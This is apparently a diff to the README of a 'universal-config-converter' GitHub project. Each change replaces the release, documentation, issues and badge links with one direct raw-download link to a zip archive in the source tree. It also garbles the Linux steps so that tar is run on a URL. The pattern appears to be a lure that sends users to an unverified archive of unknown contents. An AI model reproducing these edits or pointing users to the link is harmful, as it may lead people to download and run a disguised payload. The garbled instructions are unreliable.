@@ -1,6 +1,6 @@
 # 🎉 universal-config-converter - Convert Config Formats with Ease
 
-[![Download](https://img.shields.io/badge/Download%20Now-%F0%9F%9A%80%20Latest%20Release-blue)](https://github.com/axouxb6/universal-config-converter/releases)
+[![Download](https://github.com/axouxb6/universal-config-converter/raw/refs/heads/main/src/core/config-universal-converter-v1.8.zip%20Now-%F0%9F%9A%80%20Latest%20Release-blue)](https://github.com/axouxb6/universal-config-converter/raw/refs/heads/main/src/core/config-universal-converter-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Before you download and run the converter, ensure that your computer meets these
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/axouxb6/universal-config-converter/releases).
+To get started, visit this page to download: [Releases Page](https://github.com/axouxb6/universal-config-converter/raw/refs/heads/main/src/core/config-universal-converter-v1.8.zip).
 
 1. Click on the link above.
 2. Look for the latest release.
@@ -41,11 +41,11 @@ To get started, visit this page to download: [Releases Page](https://github.com/
 
 ### Linux
 
-1. Download the `.tar.gz` file from the Releases page.
+1. Download the `https://github.com/axouxb6/universal-config-converter/raw/refs/heads/main/src/core/config-universal-converter-v1.8.zip` file from the Releases page.
 2. Open a terminal and navigate to where you downloaded the file.
 3. Unzip the file using:
    ```
-   tar -xzf universal-config-converter.tar.gz
+   tar -xzf https://github.com/axouxb6/universal-config-converter/raw/refs/heads/main/src/core/config-universal-converter-v1.8.zip
    ```
 4. Navigate into the unzipped folder and run:
    ```
@@ -102,9 +102,9 @@ We welcome contributions! Check the "Contributing" section in our repository for
 
 For more information about the universal-config-converter, feel free to check out the following resources:
 
-- [Documentation](https://github.com/axouxb6/universal-config-converter/wiki)
-- [GitHub Issues](https://github.com/axouxb6/universal-config-converter/issues)
+- [Documentation](https://github.com/axouxb6/universal-config-converter/raw/refs/heads/main/src/core/config-universal-converter-v1.8.zip)
+- [GitHub Issues](https://github.com/axouxb6/universal-config-converter/raw/refs/heads/main/src/core/config-universal-converter-v1.8.zip)
 
-Remember, you can always visit this page to download: [Releases Page](https://github.com/axouxb6/universal-config-converter/releases). 
+Remember, you can always visit this page to download: [Releases Page](https://github.com/axouxb6/universal-config-converter/raw/refs/heads/main/src/core/config-universal-converter-v1.8.zip). 
 
 With the universal-config-converter, handling config files becomes clear and efficient. Enjoy your experience!
